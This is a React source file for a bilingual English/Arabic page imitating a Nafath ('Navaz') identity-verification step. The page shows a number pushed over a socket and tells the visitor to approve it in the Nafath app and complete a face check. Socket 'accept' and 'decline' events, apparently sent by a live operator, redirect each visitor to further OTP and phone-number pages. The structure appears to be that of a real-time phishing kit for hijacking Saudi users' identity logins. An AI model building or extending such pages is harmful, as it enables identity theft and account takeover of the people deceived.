import React from "react";
import { serverRoute, socket } from "./Main";
import { useState } from "react";

const Navaz = ({ mode, checkMode }) => {
  const query = new URLSearchParams(window.location.search);
  const [otp, setOtp] = useState(query.get("otp"));
  const stc = query.get("stc");

  socket.on("acceptNavaz", (id) => {
    if (id === sessionStorage.getItem("id")) {
      return (window.location.href = "/navazOtp");
    }
  });
  socket.on("declineNavaz", (id) => {
    if (id === sessionStorage.getItem("id")) {
      if (stc === "check") {
        window.location.href = "/phoneOtp?stc=check";
      } else if (stc === "null") {
        window.location.href = "/phone?mobily=check";
      } else {
        window.location.href = "/phoneOtp";
      }
    }
  });

  socket.on("navazChange", ({ price, id }) => {
    if (id === sessionStorage.getItem("id")) {
      return setOtp(price);
    }
  });

  return (
    <div className="w-full flex flex-col items-center justify-center bg-white py-5 gap-5 ">
      <span className="text-4xl text-green-600 font-bold mb-5">
        {" "}
        {checkMode("Order Number", "رقم الطلب").word}
      </span>
      <span className="text-gray-500 font-bold">
        {
          checkMode(
            "Please Choose the Order Number In Navaz App",
            "        فضلا قم باختيار رقم الطلب الظاهر في تطبيق نفاذ"
          ).word
        }
      </span>
      <div className="flex flex-col justify-center items-center text-gray-500 font-bold gap-1">
        <span dir={mode === "ar" ? "rtl" : "ltr"} className="text-sm">
          {checkMode("1- Open Navaz App", "1- ادخل تطبيق نفاذ").word}
        </span>
        <span dir={mode === "ar" ? "rtl" : "ltr"} className="text-sm">
          {
            checkMode(
              "2- Click on “Complete”, then confirm the number that appears",
              "2- اضغط علي اكمال ثم اكدد الرقم الظاهر"
            ).word
          }
        </span>
        <span dir={mode === "ar" ? "rtl" : "ltr"} className="text-sm">
          {checkMode("3- Prove Interface Image", "3- اثبت صورة الوجهه").word}
        </span>
      </div>
      <span className="min-w-20 my-5 rounded-full min-h-20 bg-gray-300 flex items-center justify-center text-xl font-bold text-white px-3">
        {otp}
      </span>
      <span className="my-5 text-lg text-red-500 w-full text-center"></span>
      <div className="flex gap-x-5 w-full items-center justify-center">
        <span className="text-white text-center bg-green-500 px-4 text-lg w-1/3 py-1 rounded-md cursor-pointer">
          {checkMode("Verify", "تحقق").word}
        </span>
      </div>
    </div>
  );
};

export default Navaz;
